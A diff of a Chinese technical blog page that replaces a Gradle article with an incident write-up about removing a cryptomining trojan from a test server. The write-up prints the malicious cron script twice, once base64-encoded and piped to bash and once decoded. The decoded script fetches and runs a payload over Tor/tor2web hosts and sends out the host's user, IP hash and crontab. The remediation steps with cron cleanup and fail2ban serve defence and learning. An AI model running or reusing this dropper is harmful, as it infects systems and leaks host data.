@@ -4,12 +4,13 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="Gradle 如何定位和解决依赖冲突, 技术，记录，学习，生活">
+    <meta name="keywords" content="记录一次木马进程导致CPU 700%处理经过, 技术，记录，学习，生活">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
-    <meta name="description" content="介绍在开发过程中，我们不仅要引入我们其他项目的jar包，同时随着业务的复杂度加深，也免不了要引入许多的第三方开源库，那么不可避免的会出现依赖冲突的错误。
-如何定位依赖冲突排除法排除法很简单，但是很耗时，就是选择一个依赖一个依赖的注释、编译、">
+    <meta name="description" content="事件描述登陆到测试服务器，发现CPU使用率飙到了700%，可能是机器被攻击。看进程名称，是一个异常进程在搞怪。
+处理过程
+为了让机器尽快恢复，用kill -9 18616杀掉了这个进程。没想到一会儿进程又出现了，CPU继续飙升。猜测应该是有">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +18,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Gradle 如何定位和解决依赖冲突 | 黎明的脚印</title>
+    <title>记录一次木马进程导致CPU 700%处理经过 | 黎明的脚印</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -273,7 +274,7 @@
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Gradle 如何定位和解决依赖冲突
+                        记录一次木马进程导致CPU 700%处理经过
                     </div>
                 </div>
             </div>
@@ -384,8 +385,8 @@
                     
                     <div class="article-tag">
                         
-                        <a href="/tags/gradle/" target="_blank">
-                            <span class="chip bg-color">gradle</span>
+                        <a href="/tags/运维/" target="_blank">
+                            <span class="chip bg-color">运维</span>
                         </a>
                         
                     </div>
@@ -396,8 +397,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                        <a href="/categories/gradle/" class="post-category" target="_blank">
-                            gradle
+                        <a href="/categories/运维/" class="post-category" target="_blank">
+                            运维
                         </a>
                         
                     </div>
@@ -408,7 +409,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-07-21
+                    2020-11-13
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -422,14 +423,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2k
+                    802
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    11 分
+                    3 分
                 </div>
                 
                 
@@ -445,232 +446,65 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在开发过程中，我们不仅要引入我们其他项目的jar包，同时随着业务的复杂度加深，也免不了要引入许多的第三方开源库，那么不可避免的会出现依赖冲突的错误。</p>
-<h2 id="如何定位依赖冲突"><a href="#如何定位依赖冲突" class="headerlink" title="如何定位依赖冲突"></a>如何定位依赖冲突</h2><h3 id="排除法"><a href="#排除法" class="headerlink" title="排除法"></a>排除法</h3><p>排除法很简单，但是很耗时，就是选择一个依赖一个依赖的注释、编译、看结果。</p>
-<h3 id="IDEA-gradle可视化"><a href="#IDEA-gradle可视化" class="headerlink" title="IDEA gradle可视化"></a>IDEA gradle可视化</h3><p>idea给我们提供了一个依赖树，但树只是一个平面图，并不是十分的直观。<br><img src="5C266554-7D51-4A1F-9F22-11F05CF908F7.png" alt></p>
-<h3 id="Gradle-Task"><a href="#Gradle-Task" class="headerlink" title="Gradle Task"></a>Gradle Task</h3><p>Gradle提供了一个task：dependencies，这个task能在命令行中显示依赖树之间的依赖关系。双击执行后就能在命令行中打印相关的依赖信息了.可以看到不同的buildType的信息<br><img src="A158B8C5-DE3C-4375-B120-380F66118503.png" alt><br>除了UI点击之外，也可通过命令行的方式来获取依赖树。</p>
-<pre class="line-numbers language-gradle"><code class="language-gradle"># implementation 指定的buildType信息
-./gradlew app:dependencies -q --configuration implementation
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>这里我提取一点：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">annotationProcessor - Annotation processors and their dependencies for source set 'main'.
-\--- org.projectlombok:lombok:1.18.4
-apiElements - API elements for main. (n)
-No dependencies
-
-archives - Configuration for archive artifacts.
-No dependencies
-
-asciidoctor
-+--- org.springframework.restdocs:spring-restdocs-asciidoctor -> 2.0.2.RELEASE
-+--- org.asciidoctor:asciidoctorj:1.5.3.2
-|    +--- org.jruby:jruby-complete:1.7.21
-|    \--- com.beust:jcommander:1.35
-\--- org.asciidoctor:asciidoctorj-groovy-dsl:1.0.0.preview2
-     +--- org.codehaus.groovy:groovy-all:1.8.9
-     \--- org.asciidoctor:asciidoctorj:1.5.1 -> 1.5.3.2 (*)
-
-bootArchives - Configuration for Spring Boot archive artifacts.
-No dependencies
-implementation - Implementation only dependencies for source set 'main'. (n)
-+--- project mbg-model (n)
-+--- project mbg-mapper (n)
-+--- project cmp-client (n)
-compileOnly - Compile only dependencies for source set 'main'.
-+--- org.springframework.boot:spring-boot-configuration-processor -> 2.1.1.RELEASE
-\--- org.projectlombok:lombok:1.18.4
-
-default - Configuration for default artifacts.
-+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1
-+--- org.jsoup:jsoup:1.13.1
-+--- io.springside:springside-utils:5.0.0-RC1
-|    +--- com.google.guava:guava:20.0 -> 23.0
-|    |    +--- com.google.code.findbugs:jsr305:1.3.9 -> 3.0.1
-|    |    +--- com.google.errorprone:error_prone_annotations:2.0.18
-|    |    +--- com.google.j2objc:j2objc-annotations:1.1
-|    |    \--- org.codehaus.mojo:animal-sniffer-annotations:1.14
-|    +--- org.apache.commons:commons-lang3:3.5 -> 3.8.1
-|    \--- org.slf4j:slf4j-api:1.7.22 -> 1.7.25
-compile - Dependencies for source set 'main' (deprecated, use 'implementation' instead).
-+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1
-+--- org.jsoup:jsoup:1.13.1
-\--- io.springside:springside-utils:5.0.0-RC1
-     +--- com.google.guava:guava:20.0
-     +--- org.apache.commons:commons-lang3:3.5 -> 3.8.1
-     \--- org.slf4j:slf4j-api:1.7.22 -> 1.7.25
-
-compileClasspath - Compile classpath for source set 'main'.
-+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1
-+--- org.jsoup:jsoup:1.13.1
-+--- io.springside:springside-utils:5.0.0-RC1
-|    +--- com.google.guava:guava:20.0 -> 23.0
-|    |    +--- com.google.code.findbugs:jsr305:1.3.9 -> 2.0.1
-|    |    +--- com.google.errorprone:error_prone_annotations:2.0.18
-|    |    +--- com.google.j2objc:j2objc-annotations:1.1
-|    |    \--- org.codehaus.mojo:animal-sniffer-annotations:1.14
-|    +--- org.apache.commons:commons-lang3:3.5 -> 3.8.1
-|    \--- org.slf4j:slf4j-api:1.7.22 -> 1.7.25
-+--- org.springframework.boot:spring-boot-configuration-processor -> 2.1.1.RELEASE
-+--- org.projectlombok:lombok:1.18.4
-runtimeElements - Elements of runtime for main. (n)
-No dependencies
-
-runtimeOnly - Runtime only dependencies for source set 'main'. (n)
-No dependencies
-
-testAnnotationProcessor - Annotation processors and their dependencies for source set 'test'.
-\--- org.projectlombok:lombok:1.18.4
-
-testCompile - Dependencies for source set 'test' (deprecated, use 'testImplementation' instead).
-+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1
-+--- org.jsoup:jsoup:1.13.1
-\--- io.springside:springside-utils:5.0.0-RC1
-     +--- com.google.guava:guava:20.0
-     +--- org.apache.commons:commons-lang3:3.5 -> 3.8.1
-     \--- org.slf4j:slf4j-api:1.7.22 -> 1.7.25
-
-testCompileClasspath - Compile classpath for source set 'test'.
-+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1
-+--- org.jsoup:jsoup:1.13.1
-+--- io.springside:springside-utils:5.0.0-RC1
-|    +--- com.google.guava:guava:20.0 -> 23.0
-|    |    +--- com.google.code.findbugs:jsr305:1.3.9 -> 2.0.1
-|    |    +--- com.google.errorprone:error_prone_annotations:2.0.18
-|    |    +--- com.google.j2objc:j2objc-annotations:1.1
-|    |    \--- org.codehaus.mojo:animal-sniffer-annotations:1.14
-|    +--- org.apache.commons:commons-lang3:3.5 -> 3.8.1
-|    \--- org.slf4j:slf4j-api:1.7.22 -> 1.7.25
-testCompileOnly - Compile only dependencies for source set 'test'.
-\--- org.projectlombok:lombok:1.18.4
-
-testImplementation - Implementation only dependencies for source set 'test'. (n)
-+--- org.springframework.boot:spring-boot-starter-test (n)
-+--- org.mybatis.spring.boot:mybatis-spring-boot-starter-test:1.3.2 (n)
-\--- org.springframework.restdocs:spring-restdocs-mockmvc (n)
-
-testRuntime - Runtime dependencies for source set 'test' (deprecated, use 'testRuntimeOnly' instead).
-+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1
-+--- org.jsoup:jsoup:1.13.1
-\--- io.springside:springside-utils:5.0.0-RC1
-     +--- com.google.guava:guava:20.0
-     +--- org.apache.commons:commons-lang3:3.5 -> 3.8.1
-     \--- org.slf4j:slf4j-api:1.7.22 -> 1.7.25
-testRuntimeClasspath - Runtime classpath of source set 'test'.
-+--- com.github.xiaoymin:knife4j-spring-ui:2.0.1
-+--- cn.ucloud.ufile:ufile-client-java:2.3.0 (*)
-+--- io.kubernetes:client-java:5.0.0 (*)
-+--- org.glassfish.jersey.core:jersey-client:2.11 (*)
-+--- org.glassfish.jersey.media:jersey-media-json-jackson:2.11 (*)
-+--- org.glassfish.jersey.core:jersey-common:2.11 (*)
-+--- org.apache.commons:commons-lang3:3.8.1
-+--- com.github.penggle:kaptcha:2.3.2
-|    +--- javax.servlet:javax.servlet-api:3.1.0 -> 4.0.1
-|    \--- com.jhlabs:filters:2.0.235-1
-+--- com.google.guava:guava:23.0 (*)
-+--- com.alibaba:fastjson:1.2.54
-+--- com.alibaba:druid-spring-boot-starter:1.1.10
-|    +--- com.alibaba:druid:1.1.10
-|    +--- org.slf4j:slf4j-api:1.7.25
-|    \--- org.springframework.boot:spring-boot-autoconfigure:1.5.12.RELEASE -> 2.1.1.RELEASE (*)
-+--- io.projectreactor:reactor-core:3.2.8.RELEASE
-|    \--- org.reactivestreams:reactive-streams:1.0.2
-+--- org.apache.poi:poi-ooxml:3.17
-|    +--- org.apache.poi:poi:3.17
-|    |    +--- commons-codec:commons-codec:1.10 -> 1.11
-|    |    \--- org.apache.commons:commons-collections4:4.1
-|    +--- org.apache.poi:poi-ooxml-schemas:3.17
-|    |    \--- org.apache.xmlbeans:xmlbeans:2.6.0
-|    |         \--- stax:stax-api:1.0.1
-|    \--- com.github.virtuald:curvesapi:1.04
-+--- com.squareup.okhttp3:okhttp:3.14.7 (*)
-+--- mysql:mysql-connector-java:6.0.6
-+--- org.mybatis.spring.boot:mybatis-spring-boot-starter:1.3.2 (*)
-+--- com.qcloud:cos_api:5.6.0 (*)
-+--- com.github.pagehelper:pagehelper-spring-boot-starter:1.2.10 (*)
-+--- tk.mybatis:mapper-spring-boot-starter:2.1.5
-|    +--- org.springframework.boot:spring-boot-starter:2.1.1.RELEASE (*)
-|    +--- org.springframework.boot:spring-boot-starter-jdbc:2.1.1.RELEASE (*)
-|    +--- org.mybatis:mybatis:3.4.6
-|    +--- org.mybatis:mybatis-spring:1.3.2
-|    +--- tk.mybatis:mapper-core:1.1.5
-|    |    \--- javax.persistence:persistence-api:1.0
-|    +--- tk.mybatis:mapper-base:1.1.5
-|    |    \--- javax.persistence:persistence-api:1.0
-|    +--- tk.mybatis:mapper-weekend:1.1.5
-|    +--- tk.mybatis:mapper-spring:1.1.5
-|    +--- tk.mybatis:mapper-extra:1.1.5
-|    +--- tk.mybatis:mapper-spring-boot-autoconfigure:2.1.5
-|    |    +--- org.springframework.boot:spring-boot-autoconfigure:2.1.1.RELEASE (*)
-|    |    +--- junit:junit:4.12 (*)
-|    |    \--- org.hsqldb:hsqldb:2.4.1
-|    +--- junit:junit:4.12 (*)
-|    \--- org.hsqldb:hsqldb:2.4.1
-+--- org.springframework.boot:spring-boot-devtools -> 2.1.1.RELEASE
-|    +--- org.springframework.boot:spring-boot:2.1.1.RELEASE (*)
-|    \--- org.springframework.boot:spring-boot-autoconfigure:2.1.1.RELEASE (*)
-+--- org.springframework.boot:spring-boot-starter-web -> 2.1.1.RELEASE
-|    +--- org.springframework.boot:spring-boot-starter:2.1.1.RELEASE (*)
-|    +--- org.springframework.boot:spring-boot-starter-json:2.1.1.RELEASE
-|    |    +--- org.springframework.boot:spring-boot-starter:2.1.1.RELEASE (*)
-|    |    +--- org.springframework:spring-web:5.1.3.RELEASE (*)
-|    |    +--- com.fasterxml.jackson.core:jackson-databind:2.9.7 (*)
-|    |    +--- com.fasterxml.jackson.datatype:jackson-datatype-jdk8:2.9.7
-|    |    |    +--- com.fasterxml.jackson.core:jackson-core:2.9.7
-|    |    |    \--- com.fasterxml.jackson.core:jackson-databind:2.9.7 (*)
-|    |    +--- com.fasterxml.jackson.datatype:jackson-datatype-jsr310:2.9.7
-|    |    |    +--- com.fasterxml.jackson.core:jackson-annotations:2.9.0
-|    |    |    +--- com.fasterxml.jackson.core:jackson-core:2.9.7
-|    |    |    \--- com.fasterxml.jackson.core:jackson-databind:2.9.7 (*)
-|    |    \--- com.fasterxml.jackson.module:jackson-module-parameter-names:2.9.7
-|    |         +--- com.fasterxml.jackson.core:jackson-core:2.9.7
-|    |         \--- com.fasterxml.jackson.core:jackson-databind:2.9.7 (*)
-|    +--- org.springframework.boot:spring-boot-starter-tomcat:2.1.1.RELEASE
-|    |    +--- javax.annotation:javax.annotation-api:1.3.2
-|    |    +--- org.apache.tomcat.embed:tomcat-embed-core:9.0.13
-|    |    +--- org.apache.tomcat.embed:tomcat-embed-el:9.0.13
-|    |    \--- org.apache.tomcat.embed:tomcat-embed-websocket:9.0.13
-|    |         \--- org.apache.tomcat.embed:tomcat-embed-core:9.0.13
-|    +--- org.hibernate.validator:hibernate-validator:6.0.13.Final (*)
-|    +--- org.springframework:spring-web:5.1.3.RELEASE (*)
-|    \--- org.springframework:spring-webmvc:5.1.3.RELEASE
-|         +--- org.springframework:spring-aop:5.1.3.RELEASE (*)
-|         +--- org.springframework:spring-beans:5.1.3.RELEASE (*)
-|         +--- org.springframework:spring-context:5.1.3.RELEASE (*)
-|         +--- org.springframework:spring-core:5.1.3.RELEASE (*)
-|         +--- org.springframework:spring-expression:5.1.3.RELEASE (*)
-|         \--- org.springframework:spring-web:5.1.3.RELEASE (*)
-+--- org.springframework.boot:spring-boot-starter-amqp -> 2.1.1.RELEASE
-|    +--- org.springframework.boot:spring-boot-starter:2.1.1.RELEASE (*)
-|    +--- org.springframework:spring-messaging:5.1.3.RELEASE
-|    |    +--- org.springframework:spring-beans:5.1.3.RELEASE (*)
-|    |    \--- org.springframework:spring-core:5.1.3.RELEASE (*)
-|    \--- org.springframework.amqp:spring-rabbit:2.1.2.RELEASE
-|         +--- org.springframework.amqp:spring-amqp:2.1.2.RELEASE
-|         |    +--- org.springframework:spring-core:5.1.3.RELEASE (*)
-|         |    \--- org.springframework.retry:spring-retry:1.2.2.RELEASE
-|         |         \--- org.springframework:spring-core:4.3.13.RELEASE -> 5.1.3.RELEASE (*)
-|         +--- com.rabbitmq:amqp-client:5.4.3
-|         |    \--- org.slf4j:slf4j-api:1.7.25
-|         +--- org.springframework:spring-context:5.1.3.RELEASE (*)
-|         +--- org.springframework:spring-messaging:5.1.3.RELEASE (*)
-|         \--- org.springframework:spring-tx:5.1.3.RELEASE (*)
-testRuntimeOnly - Runtime only dependencies for source set 'test'. (n)
-No dependencies<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="使用插件gradle-view"><a href="#使用插件gradle-view" class="headerlink" title="使用插件gradle-view"></a>使用插件gradle-view</h3><p>利用插件gradle-view可以直接通过面板的形式看到是哪个依赖库，具体是冲突了哪个版本。</p>
-<p>插件地址：<a href="https://plugins.jetbrains.com/plugin/7150-gradle-view" target="_blank" rel="noopener">https://plugins.jetbrains.com/plugin/7150-gradle-view</a><br><img src="7CBE789B-24EF-490D-90CF-DA06919E8C62.png" alt></p>
-<h2 id="如何解决冲突"><a href="#如何解决冲突" class="headerlink" title="如何解决冲突"></a>如何解决冲突</h2><h3 id="删除其中一个jar包"><a href="#删除其中一个jar包" class="headerlink" title="删除其中一个jar包"></a>删除其中一个jar包</h3><p>删除其中一个jar包。</p>
-<h3 id="使用exclude来去除传递依赖"><a href="#使用exclude来去除传递依赖" class="headerlink" title="使用exclude来去除传递依赖"></a>使用exclude来去除传递依赖</h3><p>在知道是哪个库的哪些依赖的情况下,可以使用exclude来去除传递依赖，<br>        exclude module：过滤模块<br>        exclude group：过滤包名下所有依赖</p>
-<p>如下：</p>
-<pre class="line-numbers language-gradle"><code class="language-gradle">implementation("com.qcloud:cos_api:5.6.0") {
-        exclude group: 'org.slf4j'
-    }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h3 id="取消所有传递依赖"><a href="#取消所有传递依赖" class="headerlink" title="取消所有传递依赖"></a>取消所有传递依赖</h3><pre class="line-numbers language-gradle"><code class="language-gradle">configurations.all {
-   transitive = false
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h3 id="强制依赖"><a href="#强制依赖" class="headerlink" title="强制依赖"></a>强制依赖</h3><p>对冲突的jar强行制定一个版本</p>
-<pre class="line-numbers language-gradle"><code class="language-gradle">gradleconfigurations.all {
-    resolutionStrategy.force "com.amazonaws:aws-java-sdk-bom:1.11.698"
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+                <h2 id="事件描述"><a href="#事件描述" class="headerlink" title="事件描述"></a>事件描述</h2><p>登陆到测试服务器，发现CPU使用率飙到了700%，可能是机器被攻击。看进程名称，是一个异常进程在搞怪。<br><img src="F4C55F2F-BAE1-43E7-9444-98B7B0F1783D.png" alt></p>
+<h2 id="处理过程"><a href="#处理过程" class="headerlink" title="处理过程"></a>处理过程</h2><ol>
+<li>为了让机器尽快恢复，用<code>kill -9 18616</code>杀掉了这个进程。<br>没想到一会儿进程又出现了，CPU继续飙升。猜测应该是有定时任务在运行</li>
+<li>执行<code>crontab -l</code> 发现果然有一条定时任务。<br><code>57 * * * * /root/.systemd-service.sh &gt; /dev/null 2&gt;&amp;1 &amp;</code><br><img src="1B372739-4214-4D44-A1F4-346BBF8C45E0.png" alt></li>
+<li>此时执行<code>crontab -e</code> 删除掉定时任务。过了一会流氓进程又死灰复燃。应该是还有其他定时任务，或者主进程没有清理</li>
+<li>定位到脚本<br>定位到定时任务脚本(仅供学习)：<pre class="line-numbers language-shell"><code class="language-shell">#!/bin/bash
+#exec &>/dev/null
+echo GmqsLAjf/AU0zNSys0cvX3jvDVQ+RgnpxMER8UQt5sWoBaWlXHA7Zevn9+vXesLe
+echo R21xc0xBamYvQVUwek5TeXMwY3ZYM2p2RFZRK1JnbnB4TUVSOFVRdDVzV29CYVdsWEhBN1pldm45K3ZYZXNMZQpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ5cnh4eHFpYTQ1eHhjZHFmd3l4NHBrNnVmeWFuYXpkd2pidjNkZTdyNG1ydHl6dHQ1bXB3MzV5ZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gLiAkSE9NRSAvdXNyL2JpbiAkZCAvdG1wIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmZXhlCmY9L2ludC4kKHVuYW1lIC1tKQp4PS4vJChkYXRlfG1kNXN1bXxjdXQgLWYxIC1kLSkKcj0kKGN1cmwgLTRmc1NMayBjaGVja2lwLmFtYXpvbmF3cy5jb218fGN1cmwgLTRmc1NMayBpcC5zYilfJCh3aG9hbWkpXyQodW5hbWUgLW0pXyQodW5hbWUgLW4pXyQoaXAgYXxncmVwICdpbmV0ICd8YXdrIHsncHJpbnQgJDInfXxtZDVzdW18YXdrIHsncHJpbnQgJDEnfSlfJChjcm9udGFiIC1sfGJhc2U2NCAtdzApCiRjIC14IHNvY2tzNWg6Ly8kczo5MDUwICR0Lm9uaW9uJGYgLW8keCAtZSRyIHx8ICRjICQxJGYgLW8keCAtZSRyCmNobW9kICt4ICR4OyR4O3JtIC1mICR4Cn0KCmZvciBoIGluIHRvcjJ3ZWIuaW4gdG9yMndlYi5pdCBvbmlvbi5mb3VuZGF0aW9uIHRvcjJ3ZWIuc3Ugb25pb24uY29tLmRlIG9uaW9uLnNoIHRvcjJ3ZWIuaW8KZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLTEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1czsgdGhlbgp1ICR0LiRoCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+发现shell内容用base64编码过了。用base64进行解码，发现是挖矿脚本。<pre class="line-numbers language-shell"><code class="language-shell">exec &>/dev/null
+export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
+d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)
+c=$(echo "curl -4fsSLkA- -m200")
+t=$(echo "yrxxxqia45xxcdqfwyx4pk6ufyanazdwjbv3de7r4mrtyztt5mpw35yd")
+sockz() {
+n=(doh.defaultroutes.de dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch)
+p=$(echo "dns-query?name=relay.tor2socks.in")
+s=$($c https://${n[$((RANDOM%13))]}/$p | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" |tr ' ' '\n'|sort -uR|head -1)
+}
+fexe() {
+for i in . $HOME /usr/bin $d /tmp /var/tmp ;do echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break;done
+}
+u() {
+sockz
+fexe
+f=/int.$(uname -m)
+x=./$(date|md5sum|cut -f1 -d-)
+r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep 'inet '|awk {'print $2'}|md5sum|awk {'print $1'})_$(crontab -l|base64 -w0)
+$c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$r
+chmod +x $x;$x;rm -f $x
+}
+for h in tor2web.in tor2web.it onion.foundation tor2web.su onion.com.de onion.sh tor2web.io
+do
+if ! ls /proc/$(head -1 /tmp/.X11-unix/01)/status; then
+u $t.$h
+else
+break
+fi
+done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li>用<code>lsof -c 进程名</code>查看该进程的系统调用信息。发现相应控制客户端已经删除使用。<br><img src="22B9B55F-B9BB-4FB9-BA4A-79C2D88689A5.png" alt></li>
+<li><code>pstree</code> 可以看到两个异常进程。用<code>ps -ef</code>获取异常进程信息。一个应该是主进程，一个应该是控制进程。</li>
+<li><code>kill -9 两个木马进程ID</code>删除掉进程。过了一会又启动，推测是有定时任务没清理干净。使用命令<code>ls /etc/cron.d</code>查看到里面还有一个0开头的文件存放着定时任务。<br>删除，然后删掉两个木马进程。删掉垃圾脚本</li>
+<li>系统恢复了短暂的宁静又出现了。查看登陆日志<code>tail -F -n 1000 /var/log/auth.log | grep &#39;failed&#39;</code> ,内网主机在ssh攻击破解。<br>解决办法：<br>修改密码<br>安装fail2ban安全工具<pre class="line-numbers language-shell"><code class="language-shell">sudo apt-get upgrade
+sudo apt-get install -y fail2ban
+sudo systemctl start fail2ban
+sudo nano /etc/fail2ban/jail.local
+#jail.local 文件内添加
+[sshd]
+enabled = true
+port = 22
+filter = sshd
+logpath = /var/log/auth.log
+maxretry = 3
+sudo systemctl restart fail2ban<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<img src="005A7DC9-BDD5-4059-A459-90643A3E91C2.png" alt></li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>服务器安全问题不容忽视，设置强密码，并控制防火墙，修改ssh默认端口号。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.base64decode.org/" target="_blank" rel="noopener">base64编解码工具</a><br><a href="https://cloud.tencent.com/developer/article/1591665" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1591665【类似病毒】</a><br><a href="https://www.freebuf.com/articles/system/208804.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/208804.html</a></p>
 
             </div>
             <hr />
@@ -829,9 +663,9 @@ No dependencies<span aria-hidden="true" class="line-numbers-rows"><span></span><
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《Gradle 如何定位和解决依赖冲突》
+                    《记录一次木马进程导致CPU 700%处理经过》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/07/21/gradle-jar-conclict/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/11/13/trojan-process-cpu-100/" property="cc:attributionName"
                rel="cc:attributionURL">
                 lendea
             </a> 采用
